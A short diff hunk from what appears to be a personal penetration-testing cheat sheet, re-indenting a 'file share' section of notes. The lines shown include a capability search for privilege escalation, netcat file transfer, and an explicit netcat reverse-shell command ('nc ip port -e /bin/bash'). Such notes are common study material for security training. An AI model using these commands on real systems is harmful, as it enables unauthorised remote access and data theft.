@@ -49,10 +49,10 @@
       getcap -r / 2>/dev/null
 
    *file share
-      nc -lvnp 9000<file.txt
-      reverse shell : nc ip port>file.txt
-      nc -lvnp 9000
-      reverse shell : nc ip port -e /bin/bash
+       nc -lvnp 9000<file.txt
+       reverse shell : nc ip port>file.txt
+       nc -lvnp 9000
+       reverse shell : nc ip port -e /bin/bash
       
       scp file username@ip /destination folder
       python -m http.server 9000
